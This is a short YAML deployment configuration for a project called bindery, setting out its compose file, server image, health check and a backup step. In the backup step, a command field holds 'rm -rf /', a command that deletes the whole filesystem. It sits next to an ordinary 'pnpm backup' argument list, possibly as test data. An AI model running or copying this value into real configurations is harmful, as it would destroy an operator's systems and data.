name: bindery
repo: matdemers1/bindery
workflow: ci.yml
compose:
  files:
    - /DATA/apps/bindery/docker-compose.yml
  project: bindery
services:
  server:
    image: ghcr.io/matdemers1/bindery/server
health:
  service: server
  port: 3000
  path: /health
steps:
  backup:
    service: server
    artifactsDir: /DATA/apps/x/backups
    argv: ["pnpm", "backup"]
    command: "rm -rf /"
